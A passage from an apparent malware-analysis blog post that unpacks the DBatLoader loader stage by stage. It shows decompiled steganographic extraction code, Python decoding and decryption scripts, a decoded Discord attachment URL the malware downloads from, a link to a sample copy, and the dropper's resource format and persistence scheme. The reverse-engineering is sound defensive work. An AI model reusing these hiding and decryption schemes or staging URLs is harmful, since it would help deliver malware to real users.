<span class="normal">53</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="kr">__fastcall</span><span class="w"> </span><span class="n">SteganoUnpack</span><span class="p">(</span><span class="n">Graphics</span><span class="o">::</span><span class="n">TBitmap</span><span class="w"> </span><span class="o">*</span><span class="n">bitmap</span><span class="p">,</span><span class="w"> </span><span class="n">BYTE</span><span class="w"> </span><span class="o">*</span><span class="n">output</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">is_bit_set</span><span class="p">;</span><span class="w"> </span><span class="c1">// al</span>

<span class="w">  </span><span class="n">payload_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">off_415BF8</span><span class="p">,</span><span class="w"> </span><span class="n">output</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">line_content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Graphics</span><span class="o">::</span><span class="n">TBitmap</span><span class="o">::</span><span class="n">GetScanline</span><span class="p">(</span><span class="n">bitmap</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="c1">// read first bitmap line</span>

<span class="w">  </span><span class="c1">// in the first 3 bytes is an integer encoded that is the number of lsb bits that should be extracted from each byte to get the payload.</span>
<span class="w">  </span><span class="c1">// (only saw the value 3 in the wild)</span>
<span class="w">  </span><span class="n">stegano_num_lsb_bits</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">                     </span>
<span class="w">  </span><span class="n">is_bit_set</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">IsBitSet</span><span class="p">(</span><span class="o">*</span><span class="n">line_content</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">SetBit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stegano_num_lsb_bits</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">is_bit_set</span><span class="p">);</span>
<span class="w">  </span><span class="n">is_bit_set</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">IsBitSet</span><span class="p">(</span><span class="o">*</span><span class="n">line_content</span><span class="p">,</span><span class="w"> </span><span class="mi">1u</span><span class="p">);</span>
<span class="w">  </span><span class="n">SetBit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stegano_num_lsb_bits</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">is_bit_set</span><span class="p">);</span>
<span class="w">  </span><span class="n">is_bit_set</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">IsBitSet</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">line_content</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">SetBit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stegano_num_lsb_bits</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="n">is_bit_set</span><span class="p">);</span>
<span class="w">  </span><span class="n">is_bit_set</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">IsBitSet</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">line_content</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">SetBit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stegano_num_lsb_bits</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="n">is_bit_set</span><span class="p">);</span>

<span class="w">  </span><span class="n">bitmap_width</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">bitmap</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">44</span><span class="p">))(</span><span class="n">bitmap</span><span class="p">);</span>
<span class="w">  </span><span class="n">bitmap_height</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">bitmap</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">32</span><span class="p">))(</span><span class="n">bitmap</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">  </span><span class="n">bitmap_line_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">  </span><span class="n">bit_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">  </span><span class="n">bitmap_row_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w">                         </span><span class="c1">// X position on current bitmap line (1-based)</span>
<span class="w">  </span><span class="n">rgb_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">                                </span><span class="c1">// which color component are we reading: 1 = RED, 2 = GREEN, B = BLUE</span>
<span class="w">  </span><span class="n">line_content</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">3</span><span class="p">;</span><span class="w">                            </span><span class="c1">// advance file pointer by 3 bytes</span>
<span class="w">  </span><span class="n">payload_bit_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">  </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">is_bit_set</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">IsBitSet</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">line_content</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">rgb_index</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="n">bit_index</span><span class="p">);</span>
<span class="w">    </span><span class="n">SetBit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">payload_size</span><span class="p">,</span><span class="w"> </span><span class="n">payload_bit_index</span><span class="p">,</span><span class="w"> </span><span class="n">is_bit_set</span><span class="p">);</span>
<span class="w">    </span><span class="n">AdvanceToNextBit</span><span class="p">();</span><span class="w">     </span><span class="c1">// will update bit_index, rgb_index, bitmap_row_index and line_content as needed</span>
<span class="w">    </span><span class="o">++</span><span class="n">payload_bit_index</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">payload_bit_index</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span><span class="p">);</span><span class="w">                </span><span class="c1">// first 32 payload bits = payload size</span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">payload_size</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">     </span><span class="c1">// start of the payload extraction process</span>
<span class="w">    </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">payload_bit_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">      </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">is_bit_set</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">IsBitSet</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">line_content</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">rgb_index</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="n">bit_index</span><span class="p">);</span>
<span class="w">        </span><span class="n">SetBit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">payload_byte</span><span class="p">,</span><span class="w"> </span><span class="n">payload_bit_index</span><span class="p">,</span><span class="w"> </span><span class="n">is_bit_set</span><span class="p">);</span>
<span class="w">        </span><span class="n">AdvanceToNextBit</span><span class="p">();</span><span class="w"> </span><span class="c1">// will update bit_index, rgb_index, bitmap_row_index and line_content as needed</span>
<span class="w">        </span><span class="o">++</span><span class="n">payload_bit_index</span><span class="p">;</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">payload_bit_index</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">8</span><span class="w"> </span><span class="p">);</span><span class="w">             </span><span class="c1">// extract 8 bits from bitmap</span>
<span class="w">      </span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">payload_data</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">16</span><span class="p">))(</span><span class="n">payload_data</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">payload_byte</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="c1">// append byte to payload data</span>
<span class="w">      </span><span class="n">System</span><span class="o">::</span><span class="n">__linkproc__</span><span class="w"> </span><span class="nf">LStrAsg</span><span class="p">(</span><span class="n">output</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">payload_data</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">--</span><span class="n">payload_size</span><span class="w"> </span><span class="p">);</span><span class="w">                   </span><span class="c1">// read &lt;payload_size&gt; bytes into &lt;output&gt;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">System</span><span class="o">::</span><span class="n">TObject</span><span class="o">::</span><span class="n">Free</span><span class="p">(</span><span class="n">payload_data</span><span class="p">);</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">System</span><span class="o">::</span><span class="n">TObject</span><span class="o">::</span><span class="n">Free</span><span class="p">(</span><span class="n">bitmap</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
<p>In a nutshell, the function reads the bitmap line by line, and each line pixel by pixel. For every byte of the bitmap, some bits (the lowest significant bits) are extracted and concatenated in order to assemble the final payload. This is textbook steganography. The first line is a bit special since it contains additional info:</p>
<ul>
<li>The first 3 bytes (so the first RGB pixel) encodes a 4 bits integer (2 bits of red component, 1 bit of green and 1 bit of blue). This integer that we named <code>stegano_num_lsb_bits</code> tells the software how many bits of each bitmap byte it should extract from the image (3 in our case)</li>
<li>Then the software jumps to the 4th byte and reads 32 bits from the bitmap into an integer. This integer is the number of bytes which should be extracted from the image (the payload size in other words)</li>
<li>Finally the software starts the payload extraction process</li>
</ul>
<p>So let us try if we got it right. We will open the bitmap <code>BBTREX</code> (which is a DIB bitmap, meaning the BITMAPFILEINFOHEADER is missing) in an hexadecimal editor and try to manually decode the first bytes. We first have to locate the first bitmap row. Good to know: bitmaps are stored upside down, i.e the top-most line is actually the last one in the file. So knowing that our bitmap is 588 pixels wide and is a RGB bitmap (so 3 bytes per pixel), the first line should start at EndOfFile - 588*3 = <code>0x44ea8</code>:</p>
<figure id="format7"><img alt="The first bitmap line" class="photo" src="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/stegano.png"/> <figcaption>Figure 7: The first bitmap line</figcaption></figure>
<p>So first thing first, we will decrypt the first 4 bits integer (aka <code>stegano_num_lsb_bits</code>). The first line starts with the 3 bytes <code>03 02 02</code>, which gives us the binary number <code>1100</code> (in LSB display) = 3. Ok.</p>
<p>Next, the algorithm moves to the second pixel and reads 32 bits. 32 bits / 3 bits per byte means it will read 10 bytes and 2 bits of the 11th byte. The next 11 bytes are: <code>00 00 00 03 06 02 00 00 00 00 04</code>, which gives us the binary number <code>000 000 000 110 011 010 000 000 000 000 00(1)</code> (in LSB display) = 91648 ok. The 11th byte contains an additional bit which we did not read which was a <code>(1)</code>.</p>
<p>Next we could start reading  2 bytes of the payload, which is 16 bits. Since we still have a bit unread from <code>04</code>, we just have to read 15 additional bits or 5 bytes. The next five bytes are: <code>06 04 04 06 02</code>, which gives us the binary numbers <code>(1) 011 001 0--01 011 010</code> or <code>0x4d--0x5a</code> ... looks like the start of a PE, great!</p>
<p>So let us put everything together and write a small extraction script using python. The following script should be run inside Malcat's script editor with the bitmap open:</p>
<div class="highlight"><table class="highlighttable table table-bordered table-responsive-sm"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span>
<span class="normal">44</span>
<span class="normal">45</span>
<span class="normal">46</span>
<span class="normal">47</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="k">def</span> <span class="nf">next_byte</span><span class="p">(</span><span class="n">malcat</span><span class="p">):</span>
    <span class="n">width</span> <span class="o">=</span> <span class="n">malcat</span><span class="o">.</span><span class="n">struct</span><span class="p">[</span><span class="s2">"BitmapInfoHeader"</span><span class="p">][</span><span class="s2">"biWidth"</span><span class="p">]</span>
    <span class="n">height</span> <span class="o">=</span> <span class="n">malcat</span><span class="o">.</span><span class="n">struct</span><span class="p">[</span><span class="s2">"BitmapInfoHeader"</span><span class="p">][</span><span class="s2">"biHeight"</span><span class="p">]</span>
    <span class="n">bpp</span> <span class="o">=</span> <span class="n">malcat</span><span class="o">.</span><span class="n">struct</span><span class="p">[</span><span class="s2">"BitmapInfoHeader"</span><span class="p">][</span><span class="s2">"biBitCount"</span><span class="p">]</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">malcat</span><span class="o">.</span><span class="n">struct</span><span class="p">[</span><span class="s2">"biImageData"</span><span class="p">]</span>
    <span class="n">line_width</span> <span class="o">=</span> <span class="n">width</span> <span class="o">*</span> <span class="p">(</span><span class="n">bpp</span> <span class="o">//</span> <span class="mi">8</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">line_width</span> <span class="o">%</span> <span class="mi">4</span><span class="p">:</span>
        <span class="n">line_width</span> <span class="o">+=</span> <span class="mi">4</span> <span class="o">-</span> <span class="p">(</span><span class="n">line_width</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">height</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">ptr</span> <span class="o">=</span> <span class="n">line_width</span> <span class="o">*</span> <span class="p">(</span><span class="n">y</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">width</span> <span class="o">*</span> <span class="p">(</span><span class="n">bpp</span> <span class="o">//</span> <span class="mi">8</span><span class="p">)):</span>
            <span class="k">yield</span> <span class="n">data</span><span class="p">[</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">x</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">next_bit</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_bits</span><span class="p">):</span>
            <span class="k">yield</span> <span class="p">(</span><span class="n">c</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span>


<span class="n">byte_iterator</span> <span class="o">=</span> <span class="n">next_byte</span><span class="p">(</span><span class="n">malcat</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
    <span class="nb">next</span><span class="p">(</span><span class="n">byte_iterator</span><span class="p">)</span>
<span class="n">bit_iterator</span> <span class="o">=</span> <span class="n">next_bit</span><span class="p">(</span><span class="n">byte_iterator</span><span class="p">)</span>


<span class="n">res</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>

<span class="c1"># read size of payload</span>
<span class="n">payload_size</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
    <span class="n">payload_size</span> <span class="o">|=</span> <span class="nb">next</span><span class="p">(</span><span class="n">bit_iterator</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">i</span>

<span class="n">cur_i</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">cur_val</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">bit_iterator</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">bit</span><span class="p">:</span>
        <span class="n">cur_val</span> <span class="o">=</span> <span class="n">cur_val</span> <span class="o">|</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">cur_i</span><span class="p">)</span>
    <span class="n">cur_i</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">if</span> <span class="n">cur_i</span> <span class="o">&gt;=</span> <span class="mi">8</span><span class="p">:</span>
        <span class="n">res</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">cur_val</span><span class="p">)</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">)</span> <span class="o">==</span> <span class="n">payload_size</span><span class="p">:</span>
            <span class="k">break</span>
        <span class="n">cur_val</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="n">cur_i</span> <span class="o">=</span> <span class="mi">0</span>


<span class="n">gui</span><span class="o">.</span><span class="n">open_after</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">res</span><span class="p">),</span> <span class="s2">"decrypted"</span><span class="p">)</span>
</code></pre></div></td></tr></table></div>
<p>Running the script gives us the second stage of DBatLoader. </p>
<h1 id="second-stage-cloud-download">Second stage: cloud download</h1>
<p>We are now looking at a Delphi binary of sha256 <code>e232e1cd61ca125fbb698cb32222a097216c83f16fe96e8ea7a8b03b00fe3e40</code> (<a href="https://www.virustotal.com/gui/file/e232e1cd61ca125fbb698cb32222a097216c83f16fe96e8ea7a8b03b00fe3e40">VT</a>). Given its small size (91KB) and API usage (wininet usage) it definitely looks like a downloader. So let us dive in this new binary.</p>
<h2 id="retrieving-the-url">Retrieving the url</h2>
<p>Who says downloader says download url, but no URL can be found in the second stage. If the url is not hard-coded in this binary, it has to be somewhere else. Remember the big big string that we've identified as suspicious in the previous binary (address <code>0x0046f718</code>)? It is mostly composed of uppercase letter, except for a short substring:</p>
<figure id="format8"><img alt="Huge string composed almost exclusively of capital letters" class="photo" src="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/string.png"/> <figcaption>Figure 8: Huge string composed almost exclusively of capital letters</figcaption></figure>
<p>And the delimiter <code>^^Nc</code> can be found as referenced string in the second stage binary at address <code>0x413f58</code>, so could it be our url? At this point we should look for decrypting functions inside one of the two binaries. But let us be smart. See how the string prefix <code>ammil3((</code> has repeated characters. Encryption is must likely a weak one-byte cipher. And we know that we are looking for an url, so the plain text string could definitely start with <code>https://</code>. So let us try a few usual cipher:</p>
<ul>
<li>XOR: the key would be 0x09 and give us <code>hdd...</code> -&gt; no</li>
<li>ROT13: ROT13 does not encode non-letter characters so not likely since the slash has been encrypted</li>
<li>ADD: the key would be 0x7 and give us <code>https://cdn.discordapp.com/attachments/902132472924479511/902136733435592744/Wbjhzkbevojgqfhfalbqxnykvunmobi</code> ... bingo!</li>
</ul>
<p>Sometimes, being lazy pays off. Note that the url is not reachable anymore at the time of writing, so I have attached a copy of the file at <a href="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/file0_stage2_dlded.bin">this address</a>. But the work is not over yet: the downloaded packet looks encrypted:</p>
<figure id="format9"><img alt="Repeating sequence in downloaded buffer" class="photo" src="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/dlded.png"/> <figcaption>Figure 9: Repeating sequence in downloaded buffer</figcaption></figure>
<h2 id="decrypting-the-file">Decrypting the file</h2>
<p>So before going further, we have to locate function responsible for decrypting the downloaded discord attachment inside the binary. While the binary is relatively small, Malcat helps us saving some time by locating two candidates functions featuring a XOR opcode inside a loop:</p>
<figure id="format10"><img alt="any XOR in a loop is a good decryption routine candidate" class="photo" src="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/xor.png"/> <figcaption>Figure 10: any XOR in a loop is a good decryption routine candidate</figcaption></figure>
<p>The function <code>sub_413b14</code> seems to be the most promising of the two, so let us have a look. This function is quite simple, and takes as input a single number in <code>ecx</code> and a Delphi string in <code>edx</code>. The number is kind of the decryption key, and will be used to generate three variables:</p>
<ul>
<li><code>[ebp-0C]</code> which is initialized with <code>0x833e - number</code> </li>
<li><code>[ebp-10]</code> which is initialized with <code>0x5e9b - number</code> </li>
<li><code>[ebp-14]</code> which is initialized with <code>0x41d6 - number</code> </li>
</ul>
<p>This input number is hard-coded. If we look to the decryption function's caller code, we can see that this numbers stems from an <code>atoi(0x41414c)</code> call at address <code>0x41408d</code>. The <code>atoi</code> parameter at address <code>0x41414c</code> is the string <code>"328"</code>, so the first mystery has been solved.</p>
<figure id="format11"><img alt="decryption function sub_413b14" class="photo" src="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/decrypt.png"/> <figcaption>Figure 11: decryption function sub_413b14</figcaption></figure>
<p>Now we just have to figure how the key stream is generated from these three variables. The assembly code of the function body is relatively simple. We converted it to a Python script that can be run inside Malcat, with the downloaded file open. Running the script will decrypt the packet:</p>
<div class="highlight"><table class="highlighttable table table-bordered table-responsive-sm"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="k">def</span> <span class="nf">decrypt_stage2</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">number</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
    <span class="n">ebp_c</span> <span class="o">=</span> <span class="mh">0x833e</span> <span class="o">-</span> <span class="n">number</span>
    <span class="n">ebp_10</span> <span class="o">=</span> <span class="mh">0x5e9b</span> <span class="o">-</span> <span class="n">number</span>
    <span class="n">ebp_14</span> <span class="o">=</span> <span class="mh">0x41d6</span> <span class="o">-</span> <span class="n">number</span>

    <span class="n">di</span> <span class="o">=</span> <span class="n">ebp_14</span>

    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
        <span class="n">e</span> <span class="o">=</span> <span class="n">c</span> <span class="o">^</span> <span class="p">(</span><span class="n">di</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span>
        <span class="n">res</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span>
        <span class="n">di</span> <span class="o">=</span> <span class="n">c</span>
        <span class="n">di</span> <span class="o">=</span> <span class="p">(</span><span class="n">di</span> <span class="o">+</span> <span class="n">ebp_14</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
        <span class="n">di</span> <span class="o">=</span> <span class="p">(</span><span class="n">di</span> <span class="o">*</span> <span class="n">ebp_c</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
        <span class="n">di</span> <span class="o">=</span> <span class="p">(</span><span class="n">di</span> <span class="o">+</span> <span class="n">ebp_10</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
    <span class="k">return</span> <span class="n">res</span>

<span class="n">decrypted</span> <span class="o">=</span> <span class="n">decrypt_stage2</span><span class="p">(</span><span class="n">malcat</span><span class="o">.</span><span class="n">file</span><span class="p">[:],</span> <span class="mi">328</span><span class="p">)</span>
<span class="n">decrypted</span> <span class="o">=</span> <span class="n">decrypted</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>                 <span class="c1"># payload is stored reversed, don't ask me why</span>
<span class="n">gui</span><span class="o">.</span><span class="n">open_after</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">decrypted</span><span class="p">),</span> <span class="s2">"decrypted"</span><span class="p">)</span>
</code></pre></div></td></tr></table></div>
<p>After decryption, we obtain yet <em>another</em> Delphi program, which would make it the third stage of the malware. </p>
<h1 id="third-stage-resource-dropper">Third stage: resource dropper</h1>
<p>We are now looking at a Delphi binary of sha256 <code>f8fc925d89baa140c9cb436f158ec91209789e9f8e82a0b7252f05587ce8e06f</code> (<a href="https://www.virustotal.com/gui/file/f8fc925d89baa140c9cb436f158ec91209789e9f8e82a0b7252f05587ce8e06f">VT</a>). It looks more like a dropper this time, since most of its size (269KB) is taken by a single resource entry named <code>YAK</code>.</p>
<figure id="format12"><img alt="Third stage of the malware: a dropper" class="photo" src="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/stage3.png"/> <figcaption>Figure 12: Third stage of the malware: a dropper</figcaption></figure>
<p>The <code>YAK</code> resource is a well-known artifact of the <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.dbatloader">DBatLoader</a> malware family. Note that Malcat does not identify it as a Delphi program because section names have been modified post-compilation and replaced with dots. Why, that's a very good question, since it only makes the binary more suspicious.</p>
<h2 id="making-sense-of-the-yak-resource">Making sense of the YAK resource</h2>
<p>The program contains all his logic inside the main function, located at the program's entry point. It performs a lot of unnecessary and over-complicated operations in order to decrypt the resource. Here is a summary:</p>
<ul>
<li>call to function <code>0x416004</code>: loads content of resource <code>YAK</code> into memory</li>
<li>call to function <code>0x416408</code>: the resource bytes gets "decrypted" using the following algorithm: for every byte b, if 0x21 &lt;= b &lt;= 0x7e: b = ( (c + 0xe) % 0x5e) + 0x21. I know, it does not make a lot of sense.</li>
<li>the first 36 bytes of the decrypted resource is a delimiter (<code>*()%@5YT!@#G__T@#$%^&amp;*()__#@$#57$#!@</code>). This delimiter is used to separate different fields in the decrypted YAK data:<ul>
<li>the first field (<code>7826546</code>) use is unknown</li>
<li>the second field is a XOR key used to decrypt the payload data</li>
<li>the third field is used to generate the filename and RunKey name used by the dropper to save and persist the dropped payload data</li>
<li>the 4th field is the encrypted payload data</li>
<li>... other field of lesser importance follow </li>
<li>the last field is another decryption key and has the value <code>328</code> (remember stage 1? Looks like the author <em>really</em> likes this number)</li>
</ul>
</li>
</ul>
<p>This is how the YAK resource looks after the first initial decryption done by function <code>0x416408</code>. We have highlighted the delimiter to better highlight the different fields: </p>
<figure id="format13"><img alt="The decrypted YAK resource first 4 fields" class="photo" src="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/yak.png"/> <figcaption>Figure 13: The decrypted YAK resource first 4 fields</figcaption></figure>
<p>Does it sound overly complicated? Wait until you have seen how the resource payload data is decrypted.</p>
<h2 id="decrypting-the-payload-data">Decrypting the payload data</h2>
<p>Now that we know the structure of the YAK resource, it is time to decrypt the payload data (aka the 4th field), which makes most of the YAK resource. The decryption process happens in four steps:</p>
<ul>
<li>function <code>0x415c40</code> decrypts Xor the data using the second field (<code>ipnwxoenebxarqdhdiseentqdtfigqgzpuxlxi</code>) as key. But every byte is not only XORed with a byte of the key, but also with the size of the payload AND the size of the key.</li>
<li>the result is reversed. </li>
<li>function <code>0x416368</code> decrypts the final result using the last field (<code>328</code>) as key. Every byte is added with the value <code>335 % 328</code> = <code>7</code>.</li>
